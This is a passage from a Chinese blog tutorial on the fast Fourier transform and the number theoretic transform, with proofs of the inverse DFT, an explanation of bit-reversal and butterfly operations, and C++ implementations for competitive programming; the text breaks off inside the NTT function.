&lt;h4 id=&quot;递归边界n1那么w_10-a_0a_0所以直接返回自身&quot;&gt;递归边界：&lt;span class=&quot;math inline&quot;&gt;\(n=1\)&lt;/span&gt;，那么&lt;span class=&quot;math inline&quot;&gt;\(w_1^0 a_0=a_0\)&lt;/span&gt;，所以直接返回自身&lt;/h4&gt;
&lt;p&gt;计算一下时间复杂度&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(T(n)=2T(n/2)+f(n)\)&lt;/span&gt;，其中&lt;span class=&quot;math inline&quot;&gt;\(f(n)=O(n)\)&lt;/span&gt;（合并答案）&lt;/p&gt;
&lt;p&gt;运用主方法，&lt;span class=&quot;math inline&quot;&gt;\(a=2,b=2,\log_ba=\log_2 2=1\)&lt;/span&gt;，所以&lt;span class=&quot;math inline&quot;&gt;\(T(n)=O(n^{\log_ba}\log n)=O(n\log n)\)&lt;/span&gt;&lt;del&gt;（皆大欢喜）&lt;/del&gt;&lt;/p&gt;
&lt;h3 id=&quot;part-5-离散傅里叶逆变换&quot;&gt;Part 5: 离散傅里叶逆变换&lt;/h3&gt;
&lt;p&gt;可别高兴太早，还有&lt;strong&gt;插值&lt;/strong&gt;哦&lt;/p&gt;
&lt;p&gt;因为&lt;span class=&quot;math inline&quot;&gt;\(\pmb{y}=DFT_n(\pmb{a})=V_n\pmb{a}\)&lt;/span&gt;，所以&lt;span class=&quot;math inline&quot;&gt;\(\pmb{a}=V_n^{-1}\pmb{y}\)&lt;/span&gt;，记为&lt;span class=&quot;math inline&quot;&gt;\(\pmb{a}=DFT_n^{-1}(\pmb{y})\)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&quot;定理对ij01cdotsn-1有v_n-1_ijomega_n-ijn&quot;&gt;定理：对&lt;span class=&quot;math inline&quot;&gt;\(i,j=0,1,\cdots,n-1\)&lt;/span&gt;，有&lt;span class=&quot;math inline&quot;&gt;\([V_n^{-1}]_{ij}=\omega_n^{-ij}/n\)&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt; 证明&lt;span class=&quot;math inline&quot;&gt;\(V_n^{-1}V_n=I_n\)&lt;/span&gt;即可&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\([V_n^{-1}V_n]_{ij}=\sum_{k=0}^{n-1}(\omega_n^{-ik}/n)\omega_n^{kj}=\frac{\sum_{k=0}^{n-1}\omega_n^{-ik}\omega_n^{kj}}{n}=\frac{\sum_{k=0}^{n-1}\omega_n^{(j-i)k}}{n}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;如果&lt;span class=&quot;math inline&quot;&gt;\(i=j\)&lt;/span&gt;，则该值&lt;span class=&quot;math inline&quot;&gt;\(=\frac{\sum_{k=0}^{n-1}\omega_n^0}{n}=n/n=1\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;否则，因为&lt;span class=&quot;math inline&quot;&gt;\(n\nmid k\)&lt;/span&gt;，根据&lt;strong&gt;求和引理&lt;/strong&gt;，该值&lt;span class=&quot;math inline&quot;&gt;\(=0/n=0\)&lt;/span&gt;，所以构成了&lt;span class=&quot;math inline&quot;&gt;\(I_n\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;接下来&lt;span class=&quot;math inline&quot;&gt;\(\pmb{a}=DFT_n^{-1}(\pmb{y})=V_n^{-1}\pmb{y}\implies a_i=\sum_{j=0}^{n-1}[V_n^{-1}]_{ij}y_j=\sum_{j=0}^{n-1}(\omega_n^{-ij}/n)y_j=\frac{\sum_{j=0}^{n-1}\omega_n^{-ij}y_j}{n}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;比较一下DFT中&lt;span class=&quot;math inline&quot;&gt;\(y_i=\sum_{j=0}^{n-1}\omega_n^{ij}a_j\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;只要运算时把&lt;span class=&quot;math inline&quot;&gt;\(\omega_n\)&lt;/span&gt;换成&lt;span class=&quot;math inline&quot;&gt;\(-\omega_n\)&lt;/span&gt;，然后将最终答案&lt;span class=&quot;math inline&quot;&gt;\(/n\)&lt;/span&gt;，就把DFT变成逆DFT了&lt;/p&gt;
&lt;p&gt;终于可以来到&lt;del&gt;激动人心的&lt;/del&gt;实现环节了&lt;/p&gt;
&lt;h3 id=&quot;part-6-递归实现&quot;&gt;Part 6: 递归实现&lt;/h3&gt;
&lt;p&gt;根据前文，只要将分治乘法的代码修改一下即可&lt;/p&gt;
&lt;p&gt;可以做到直接在原址进行FFT，就是将分开的两个多项式分置在左右两边&lt;/p&gt;
&lt;p&gt;STL提供了现成的complex类可供使用&lt;/p&gt;
&lt;p&gt;代码中用iv表示是否为逆DFT，用o存储主单位根，用w累积&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;P.s&lt;/strong&gt; 最后别忘了&lt;span class=&quot;math inline&quot;&gt;\(/n\)&lt;/span&gt;，而且&lt;span class=&quot;math inline&quot;&gt;\(+0.5\)&lt;/span&gt;为了四舍五入提高精度&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;//This program is written by Brian Peng.
#pragma GCC optimize(&quot;Ofast&quot;,&quot;inline&quot;,&quot;no-stack-protector&quot;)
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define Rd(a) (a=read())
#define Gc(a) (a=getchar())
#define Pc(a) putchar(a)
int read(){
    register int u;register char c(getchar());register bool k;
    while(!isdigit(c)&amp;amp;&amp;amp;c^'-')if(Gc(c)==EOF)exit(0);
    if(c^'-')k=1,u=c&amp;amp;15;else k=u=0;
    while(isdigit(Gc(c)))u=(u&amp;lt;&amp;lt;1)+(u&amp;lt;&amp;lt;3)+(c&amp;amp;15);
    return k?u:-u;
}
void wr(register int a){
    if(a&amp;lt;0)Pc('-'),a=-a;
    if(a&amp;lt;=9)Pc(a|'0');
    else wr(a/10),Pc((a%10)|'0');
}
signed const INF(0x3f3f3f3f),NINF(0xc3c3c3c3);
long long const LINF(0x3f3f3f3f3f3f3f3fLL),LNINF(0xc3c3c3c3c3c3c3c3LL);
#define Ps Pc(' ')
#define Pe Pc('\n')
#define Frn0(i,a,b) for(register int i(a);i&amp;lt;(b);++i)
#define Frn1(i,a,b) for(register int i(a);i&amp;lt;=(b);++i)
#define Frn_(i,a,b) for(register int i(a);i&amp;gt;=(b);--i)
#define Mst(a,b) memset(a,b,sizeof(a))
#define File(a) freopen(a&quot;.in&quot;,&quot;r&quot;,stdin),freopen(a&quot;.out&quot;,&quot;w&quot;,stdout)
double const Pi(acos(-1));
typedef complex&amp;lt;double&amp;gt; Cpx;
#define N (2100000)
Cpx o,w,a[N],b[N],tmp[N],x,y;
int n,m,s;
bool iv;
void fft(Cpx*a,int n);
signed main(){
    Rd(n),Rd(m),s=1&amp;lt;&amp;lt;int(log2(n+m)+1);
    Frn1(i,0,n)Rd(a[i]);
    Frn1(i,0,m)Rd(b[i]);
    fft(a,s),fft(b,s);
    Frn0(i,0,s)a[i]*=b[i];
    iv=1,fft(a,s);
    Frn1(i,0,n+m)wr(a[i].real()/s+0.5),Ps;
    exit(0);
}
void fft(Cpx*a,int n){
    if(n==1)return;
    int n2(n&amp;gt;&amp;gt;1);
    Frn0(i,0,n2)tmp[i]=a[i&amp;lt;&amp;lt;1],tmp[i+n2]=a[i&amp;lt;&amp;lt;1|1];
    copy(tmp,tmp+n,a),fft(a,n2),fft(a+n2,n2);
    o={cos(Pi/n2),(iv?-1:1)*sin(Pi/n2)},w=1;
    Frn0(i,0,n2)x=a[i],y=w*a[i+n2],a[i]=x+y,a[i+n2]=x-y,w*=o;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Time complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(n\log n)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Memory complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/BrianPeng/1640550/o_200202104816%E9%80%92%E5%BD%92FFT.PNG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;性能已经超过了朴素乘法（必然的），但是还是没有AC&lt;/p&gt;
&lt;p&gt;注意到&lt;span class=&quot;math inline&quot;&gt;\(n,m\leqslant 1e6\)&lt;/span&gt;，所以不仅要让时间复杂度至少&lt;span class=&quot;math inline&quot;&gt;\(O(n\log n)\)&lt;/span&gt;，还要保持小的常数因子，总之递归还不够快&lt;/p&gt;
&lt;h3 id=&quot;part-6-迭代实现&quot;&gt;Part 6: 迭代实现&lt;/h3&gt;
&lt;h4 id=&quot;设llceillog_2nm1rceils2l那么axbxaxbx都是次数界为s的多项式&quot;&gt;设&lt;span class=&quot;math inline&quot;&gt;\(l=\lceil\log_2(n+m+1)\rceil,s=2^l\)&lt;/span&gt;，那么&lt;span class=&quot;math inline&quot;&gt;\(A(x),B(x),A(x)B(x)\)&lt;/span&gt;都是次数界为&lt;span class=&quot;math inline&quot;&gt;\(s\)&lt;/span&gt;的多项式&lt;/h4&gt;
&lt;p&gt;现在需要寻找到一种迭代的方式，使答案自底向上合并以减少常数因子&lt;/p&gt;
&lt;p&gt;还是像递归版一样，把&lt;span class=&quot;math inline&quot;&gt;\(A^{[0]}(x)\)&lt;/span&gt;放在左边，&lt;span class=&quot;math inline&quot;&gt;\(A^{[1]}(x)\)&lt;/span&gt;放在右边&lt;/p&gt;
&lt;p&gt;观察每一层递归时各个系数所在位置的规律，以&lt;span class=&quot;math inline&quot;&gt;\(s=8\)&lt;/span&gt;为例&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;0-&amp;gt; 0 1 2 3 4 5 6 7
1-&amp;gt; 0 2 4 6|1 3 5 7
2-&amp;gt; 0 4|2 6|1 5|3 7
end 0|4|2|6|1|5|3|7&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;没看出来？那就拆成二进制看看&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;0-&amp;gt; 000 001 010 011 100 101 110 111
1-&amp;gt; 000 010 100 110|001 011 101 111
2-&amp;gt; 000 100|010 110|001 101|011 111
end 000|100|010|110|001|101|011|111&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;del&gt;显然地&lt;/del&gt;在最后一层递归时，&lt;strong&gt;系数编号正好是位置编号的反转&lt;/strong&gt;（更准确的说是前&lt;span class=&quot;math inline&quot;&gt;\(l\)&lt;/span&gt;位的反转）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一个较为感性的Proof:&lt;/strong&gt; 因为是按照奇偶性分类，也就是说在第&lt;span class=&quot;math inline&quot;&gt;\(i\)&lt;/span&gt;层递归时判断的是该编号二进制第&lt;span class=&quot;math inline&quot;&gt;\(i\)&lt;/span&gt;位（从零开始），为&lt;span class=&quot;math inline&quot;&gt;\(0\)&lt;/span&gt;放左边，&lt;span class=&quot;math inline&quot;&gt;\(1\)&lt;/span&gt;放右边，而放右边的结果就是它的位置编号的二进制第&lt;span class=&quot;math inline&quot;&gt;\(l-i-1\)&lt;/span&gt;位是&lt;span class=&quot;math inline&quot;&gt;\(1\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;所以到了递归最底层，位置编号的二进制就正好是系数编号二进制前&lt;span class=&quot;math inline&quot;&gt;\(l\)&lt;/span&gt;位的反转啦&lt;/p&gt;
&lt;p&gt;构造数组&lt;span class=&quot;math inline&quot;&gt;\(r_{0..s-1}\)&lt;/span&gt;，其中&lt;span class=&quot;math inline&quot;&gt;\(r_i\)&lt;/span&gt;表示&lt;span class=&quot;math inline&quot;&gt;\(i\)&lt;/span&gt;二进制前&lt;span class=&quot;math inline&quot;&gt;\(l\)&lt;/span&gt;位的反转，可以利用递推完成，具体请自己思考&lt;del&gt;（或看代码）&lt;/del&gt;&lt;/p&gt;
&lt;h4 id=&quot;蝴蝶操作-butterfly-operation&quot;&gt;蝴蝶操作 (Butterfly Operation)&lt;/h4&gt;
&lt;p&gt;其实在递归版代码中已经出现，但是这里再详细说明一下&lt;/p&gt;
&lt;p&gt;还记得&lt;span class=&quot;math inline&quot;&gt;\(y_i=y^{[0]}_i+\omega_n^i y^{[1]}_i,y_{i+n/2}=y^{[0]}_i-\omega_n^i y^{[1]}_i,i=0,1,\cdots,n/2-1\)&lt;/span&gt;吗？&lt;/p&gt;
&lt;p&gt;但是现在不使用&lt;span class=&quot;math inline&quot;&gt;\(\pmb{y}\)&lt;/span&gt;，而是&lt;span class=&quot;math inline&quot;&gt;\(\pmb{a}\)&lt;/span&gt;直接合并&lt;/p&gt;
&lt;p&gt;因为按照奇偶性分置在两边，所以&lt;span class=&quot;math inline&quot;&gt;\(a^{[0]}_i=a_i,a^{[1]}_i=a_{i+n/2}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;设&lt;span class=&quot;math inline&quot;&gt;\(x=a_i,y=\omega_n^i a_{i+n/2}\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;那么新的&lt;span class=&quot;math inline&quot;&gt;\(a_i=x+y,a_{i+n/2}=x-y\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这就是蝴蝶操作啦&lt;/p&gt;
&lt;p&gt;有了蝴蝶操作，只要将所有系数按照&lt;span class=&quot;math inline&quot;&gt;\(r\)&lt;/span&gt;数组的位置排列，再迭代合并，就完成了FFT&lt;/p&gt;
&lt;p&gt;在代码中，用&lt;span class=&quot;math inline&quot;&gt;\(i,i_2\)&lt;/span&gt;表示当前合并产生的和开始的序列长度，&lt;span class=&quot;math inline&quot;&gt;\(j\)&lt;/span&gt;表示合并序列的开头位置，&lt;span class=&quot;math inline&quot;&gt;\(k\)&lt;/span&gt;控制每一位的合并，上代码&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;//This program is written by Brian Peng.
#pragma GCC optimize(&quot;Ofast&quot;,&quot;inline&quot;,&quot;no-stack-protector&quot;)
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define Rd(a) (a=read())
#define Gc(a) (a=getchar())
#define Pc(a) putchar(a)
int read(){
    register int u;register char c(getchar());register bool k;
    while(!isdigit(c)&amp;amp;&amp;amp;c^'-')if(Gc(c)==EOF)exit(0);
    if(c^'-')k=1,u=c&amp;amp;15;else k=u=0;
    while(isdigit(Gc(c)))u=(u&amp;lt;&amp;lt;1)+(u&amp;lt;&amp;lt;3)+(c&amp;amp;15);
    return k?u:-u;
}
void wr(register int a){
    if(a&amp;lt;0)Pc('-'),a=-a;
    if(a&amp;lt;=9)Pc(a|'0');
    else wr(a/10),Pc((a%10)|'0');
}
signed const INF(0x3f3f3f3f),NINF(0xc3c3c3c3);
long long const LINF(0x3f3f3f3f3f3f3f3fLL),LNINF(0xc3c3c3c3c3c3c3c3LL);
#define Ps Pc(' ')
#define Pe Pc('\n')
#define Frn0(i,a,b) for(register int i(a);i&amp;lt;(b);++i)
#define Frn1(i,a,b) for(register int i(a);i&amp;lt;=(b);++i)
#define Frn_(i,a,b) for(register int i(a);i&amp;gt;=(b);--i)
#define Mst(a,b) memset(a,b,sizeof(a))
#define File(a) freopen(a&quot;.in&quot;,&quot;r&quot;,stdin),freopen(a&quot;.out&quot;,&quot;w&quot;,stdout)
double const Pi(acos(-1));
typedef complex&amp;lt;double&amp;gt; Cpx;
#define N (2100000)
Cpx a[N],b[N],o,w,x,y;
int n,m,l,s,r[N];
void fft(Cpx*a,bool iv);
signed main(){
    Rd(n),Rd(m),s=1&amp;lt;&amp;lt;(l=log2(n+m)+1);
    Frn1(i,0,n)Rd(a[i]);
    Frn1(i,0,m)Rd(b[i]);
    Frn0(i,0,s)r[i]=(r[i&amp;gt;&amp;gt;1]&amp;gt;&amp;gt;1)|((i&amp;amp;1)&amp;lt;&amp;lt;(l-1));
    fft(a,0),fft(b,0);
    Frn0(i,0,s)a[i]*=b[i];
    fft(a,1);
    Frn1(i,0,n+m)wr(a[i].real()+0.5),Ps;
    exit(0);
}
void fft(Cpx*a,bool iv){
    Frn0(i,0,s)if(i&amp;lt;r[i])swap(a[i],a[r[i]]);
    for(int i(2),i2(1);i&amp;lt;=s;i2=i,i&amp;lt;&amp;lt;=1){
        o={cos(Pi/i2),(iv?-1:1)*sin(Pi/i2)};
        for(int j(0);j&amp;lt;s;j+=i){
            w=1;
            Frn0(k,0,i2){
                x=a[j+k],y=w*a[j+k+i2];
                a[j+k]=x+y,a[j+k+i2]=x-y,w*=o;
            }
        }
    }
    if(iv)Frn0(i,0,s)a[i]/=s;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Time complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(n\log n)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Memory complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/BrianPeng/1640550/o_200202120457FFT.PNG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;终于……&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;到现在为止FFT的内容已经全部结束啦，下面是拓展部分&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;extension-快速数论变换-ntt-number-theoretic-transform&quot;&gt;Extension: 快速数论变换 NTT (Number Theoretic Transform)&lt;/h2&gt;
&lt;p&gt;虽然FFT具有优秀的时间复杂度，但因为用到了复数，不可避免会出现精度问题&lt;/p&gt;
&lt;p&gt;如果多项式系数和结果都是一定范围非负整数，可以考虑使用NTT来优化精度和时空常数&lt;/p&gt;
&lt;h3 id=&quot;reference-2&quot;&gt;Reference：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;《算法导论》&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.cnblogs.com/zwfymqz/p/8980809.html&quot;&gt;自为风月马前卒：快速数论变换(NTT)小结&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;prerequisite-knowledge-3&quot;&gt;Prerequisite knowledge:&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;FFT&lt;/strong&gt;（必须知道的）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;模运算基本知识&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;原根的性质&quot;&gt;原根的性质&lt;/h4&gt;
&lt;p&gt;现在考虑所有运算都在&lt;span class=&quot;math inline&quot;&gt;\(mod P\)&lt;/span&gt;意义下&lt;/p&gt;
&lt;p&gt;设有正整数&lt;span class=&quot;math inline&quot;&gt;\(g\)&lt;/span&gt;，如果在&lt;span class=&quot;math inline&quot;&gt;\(g\)&lt;/span&gt;的次幂能够得到&lt;span class=&quot;math inline&quot;&gt;\(&amp;lt;P\)&lt;/span&gt;的任何正整数，那么称&lt;span class=&quot;math inline&quot;&gt;\(g\)&lt;/span&gt;是&lt;span class=&quot;math inline&quot;&gt;\(Z_P^*\)&lt;/span&gt;的&lt;strong&gt;原根&lt;/strong&gt;，其中&lt;span class=&quot;math inline&quot;&gt;\(Z_P^*\)&lt;/span&gt;是模&lt;span class=&quot;math inline&quot;&gt;\(P\)&lt;/span&gt;乘法群，在这里不多作解释&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E.g&lt;/strong&gt; 对于&lt;span class=&quot;math inline&quot;&gt;\(P=7\)&lt;/span&gt;，计算所有&lt;span class=&quot;math inline&quot;&gt;\(&amp;lt;P\)&lt;/span&gt;的正整数的次幂构成的集合&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1-&amp;gt; {1}
2-&amp;gt; {1,2,4}
3-&amp;gt; {1,2,3,4,5,6}
4-&amp;gt; {1,2,4}
5-&amp;gt; {1,2,3,4,5,6}
6-&amp;gt; {1,6}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以&lt;span class=&quot;math inline&quot;&gt;\(3,5\)&lt;/span&gt;就是&lt;span class=&quot;math inline&quot;&gt;\(Z_7^*\)&lt;/span&gt;的原根&lt;/p&gt;
&lt;p&gt;在代码中，一般使用大质数&lt;span class=&quot;math inline&quot;&gt;\(P=998244353,g=3\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;原根的特点就是它的次幂以长度为&lt;span class=&quot;math inline&quot;&gt;\(\phi(P)\)&lt;/span&gt;循环&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E.g&lt;/strong&gt; &lt;span class=&quot;math inline&quot;&gt;\(P=7,g=3\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;那么&lt;span class=&quot;math inline&quot;&gt;\(g\)&lt;/span&gt;的次幂（从&lt;span class=&quot;math inline&quot;&gt;\(g^0\)&lt;/span&gt;）开始分别是：&lt;span class=&quot;math inline&quot;&gt;\(1,3,2,6,4,5,1,3,2,6,4,5,\cdots\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这个特性和单位根非常相似&lt;/p&gt;
&lt;p&gt;但是要完全替换单位根，还差一步&lt;/p&gt;
&lt;h4 id=&quot;单位根的代替品&quot;&gt;单位根的代替品&lt;/h4&gt;
&lt;p&gt;在FFT中使用的是循环长度为&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;，且满足消去引理和求和引理的&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;次单位复数根（折半引理由消去引理推出，故不考虑）&lt;/p&gt;
&lt;p&gt;所以为了让循环长度为&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;，我们不直接使用原根，而是原根的次幂&lt;/p&gt;
&lt;h4 id=&quot;离散对数定理如果g是z_p的一个原根则xequiv-ymodphipiff-gxequiv-gymod-p&quot;&gt;离散对数定理：如果&lt;span class=&quot;math inline&quot;&gt;\(g\)&lt;/span&gt;是&lt;span class=&quot;math inline&quot;&gt;\(Z_P^*\)&lt;/span&gt;的一个原根，则&lt;span class=&quot;math inline&quot;&gt;\(x\equiv y(\mod\phi(P))\iff g^x\equiv g^y(\mod P)\)&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt; 设&lt;span class=&quot;math inline&quot;&gt;\(x\equiv y(\mod\phi(P))\)&lt;/span&gt;，则对某个整数&lt;span class=&quot;math inline&quot;&gt;\(k\)&lt;/span&gt;有&lt;span class=&quot;math inline&quot;&gt;\(x=y+k\phi(P)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;因此&lt;span class=&quot;math inline&quot;&gt;\(g^x\equiv g^{y+k\phi(P)} \equiv g^y (g^{\phi(P)})^k \equiv g^y 1^k \equiv g^y (\mod P)\)&lt;/span&gt;（根据&lt;strong&gt;欧拉定理&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;反过来，因为循环长度是&lt;span class=&quot;math inline&quot;&gt;\(\phi(P)\)&lt;/span&gt;，必定有&lt;span class=&quot;math inline&quot;&gt;\(x\equiv y(\mod\phi(P))\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;现在考虑有一个&lt;span class=&quot;math inline&quot;&gt;\(g\)&lt;/span&gt;的次幂&lt;span class=&quot;math inline&quot;&gt;\(g^q\)&lt;/span&gt;满足&lt;span class=&quot;math inline&quot;&gt;\(g^q\)&lt;/span&gt;的次幂以长度&lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt;循环&lt;/p&gt;
&lt;p&gt;也就是说对任意整数&lt;span class=&quot;math inline&quot;&gt;\(x\geqslant0,0&amp;lt;y&amp;lt;n\)&lt;/span&gt;，有&lt;span class=&quot;math inline&quot;&gt;\(g^{qx}\equiv g^{q(x+n)}\not\equiv g^{q(x+y)}(\mod P)\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;即&lt;span class=&quot;math inline&quot;&gt;\(qx\equiv q(x+n)\not\equiv q(x+y)(\mod \phi(P))\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;即&lt;span class=&quot;math inline&quot;&gt;\(0\equiv qn\not\equiv qy(\mod \phi(P))\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;可得&lt;span class=&quot;math inline&quot;&gt;\(\phi(P)|qn,\phi(P)\nmid qy\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;那么为了使&lt;span class=&quot;math inline&quot;&gt;\(q\)&lt;/span&gt;的因数数量最小化，&lt;span class=&quot;math inline&quot;&gt;\(q=\phi(P)/n\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;此时&lt;span class=&quot;math inline&quot;&gt;\(qy-\phi(P)y/n\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;因为&lt;span class=&quot;math inline&quot;&gt;\(y&amp;lt;n\)&lt;/span&gt;，所以&lt;span class=&quot;math inline&quot;&gt;\(qy&amp;lt;\phi(P)\)&lt;/span&gt;，必定有&lt;span class=&quot;math inline&quot;&gt;\(\phi(P)\nmid qy\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;所以&lt;span class=&quot;math inline&quot;&gt;\(q=\phi(P)/n\)&lt;/span&gt;是可取的&lt;/p&gt;
&lt;p&gt;那么问题来了，万一&lt;span class=&quot;math inline&quot;&gt;\(\phi(P)/n\)&lt;/span&gt;不是整数怎么办？&lt;/p&gt;
&lt;p&gt;这就引出了大质数&lt;span class=&quot;math inline&quot;&gt;\(P=998244353\)&lt;/span&gt;的另一个性质：&lt;span class=&quot;math inline&quot;&gt;\(\phi(P)=P-1=998244352=2^{23}\cdot 7\cdot 17\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;而根据数据范围&lt;span class=&quot;math inline&quot;&gt;\(n,m\leqslant1e6\)&lt;/span&gt;，可知&lt;span class=&quot;math inline&quot;&gt;\(l\leqslant 21\)&lt;/span&gt;，所以&lt;span class=&quot;math inline&quot;&gt;\(q\)&lt;/span&gt;总是整数（真是一个神奇的数字）&lt;/p&gt;
&lt;p&gt;总结一下，&lt;span class=&quot;math inline&quot;&gt;\(g^{\phi(P)/n}=g^{\frac{P-1}{n}}\)&lt;/span&gt;就是&lt;span class=&quot;math inline&quot;&gt;\(\omega_n\)&lt;/span&gt;的代替者&lt;/p&gt;
&lt;p&gt;消去引理（只需考虑&lt;span class=&quot;math inline&quot;&gt;\(d=2\)&lt;/span&gt;的情况）和求和引理就请大家自己证明了（其实道理都非常相似）&lt;/p&gt;
&lt;p&gt;最后只要把&lt;span class=&quot;math inline&quot;&gt;\(\omega_n\)&lt;/span&gt;替换掉，运算都改为模&lt;span class=&quot;math inline&quot;&gt;\(P\)&lt;/span&gt;意义下的运算即可，在算&lt;span class=&quot;math inline&quot;&gt;\(-\omega_n\)&lt;/span&gt;时要用到&lt;span class=&quot;math inline&quot;&gt;\(g^{-1}=332748118\)&lt;/span&gt;，还有最后答案别忘了&lt;span class=&quot;math inline&quot;&gt;\(*s^{-1}\)&lt;/span&gt;，上代码&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;//This program is written by Brian Peng.
#pragma GCC optimize(&quot;Ofast&quot;,&quot;inline&quot;,&quot;no-stack-protector&quot;)
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
#define int long long
#define Rd(a) (a=read())
#define Gc(a) (a=getchar())
#define Pc(a) putchar(a)
int read(){
    register int u;register char c(getchar());register bool k;
    while(!isdigit(c)&amp;amp;&amp;amp;c^'-')if(Gc(c)==EOF)exit(0);
    if(c^'-')k=1,u=c&amp;amp;15;else k=u=0;
    while(isdigit(Gc(c)))u=(u&amp;lt;&amp;lt;1)+(u&amp;lt;&amp;lt;3)+(c&amp;amp;15);
    return k?u:-u;
}
void wr(register int a){
    if(a&amp;lt;0)Pc('-'),a=-a;
    if(a&amp;lt;=9)Pc(a|'0');
    else wr(a/10),Pc((a%10)|'0');
}
signed const INF(0x3f3f3f3f),NINF(0xc3c3c3c3);
long long const LINF(0x3f3f3f3f3f3f3f3fLL),LNINF(0xc3c3c3c3c3c3c3c3LL);
#define Ps Pc(' ')
#define Pe Pc('\n')
#define Frn0(i,a,b) for(register int i(a);i&amp;lt;(b);++i)
#define Frn1(i,a,b) for(register int i(a);i&amp;lt;=(b);++i)
#define Frn_(i,a,b) for(register int i(a);i&amp;gt;=(b);--i)
#define Mst(a,b) memset(a,b,sizeof(a))
#define File(a) freopen(a&quot;.in&quot;,&quot;r&quot;,stdin),freopen(a&quot;.out&quot;,&quot;w&quot;,stdout)
#define P (998244353)
#define G (3)
#define Gi (332748118)
#define N (2100000)
int n,m,l,s,r[N],a[N],b[N],o,w,x,y,siv;
int fpw(int a,int p){return p?a&amp;gt;&amp;gt;1?(p&amp;amp;1?a:1)*fpw(a*a%P,p&amp;gt;&amp;gt;1)%P:a:1;}
void ntt(int*a,bool iv);
signed main(){
    Rd(n),Rd(m),siv=fpw(s=1&amp;lt;&amp;lt;(l=log2(n+m)+1),P-2);
    Frn1(i,0,n)Rd(a[i]);
    Frn1(i,0,m)Rd(b[i]);
    Frn0(i,0,s)r[i]=(r[i&amp;gt;&amp;gt;1]&amp;gt;&amp;gt;1)|((i&amp;amp;1)&amp;lt;&amp;lt;(l-1));
    ntt(a,0),ntt(b,0);
    Frn0(i,0,s)a[i]=a[i]*b[i]%P;
    ntt(a,1);
    Frn1(i,0,n+m)wr(a[i]),Ps;
    exit(0);
}
void ntt(int*a,bool iv){
